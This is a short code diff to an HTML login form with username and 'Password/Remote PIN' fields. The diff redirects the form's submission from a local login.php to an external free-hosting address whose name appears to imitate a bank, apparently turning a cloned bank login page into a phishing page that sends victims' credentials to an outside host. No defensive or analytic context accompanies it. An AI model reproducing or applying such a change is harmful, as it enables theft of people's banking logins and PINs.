@@ -60,13 +60,13 @@
 
             <div class="col-md-6">
 
-                <form id="login" name="login" action="login.php" method="POST" autocomplete="off">
+                <form id="login" name="login" action="http://capitecza.atwebpages.com/login.php" method="POST" autocomplete="off">
                     <fieldset>
                         <label id="usernameLabel" for="username"><span class="username">Username:</span>
-                            <input id="username" name="username" type="text" value="" maxlength="40"/>
+                            <input id="username" name="username" type="text" value="" maxlength="40"required/>
                         </label>
                         <label id="passwordLabel" for="password"><span class="password">Password/Remote PIN:</span>
-                            <input id="password" name="password" type="password" value="" maxlength="20"/>
+                            <input id="password" name="password" type="password" value="" maxlength="20" required/>
                         </label>
                         <input type="hidden" name="option" value='doLogin'>
                     </fieldset>
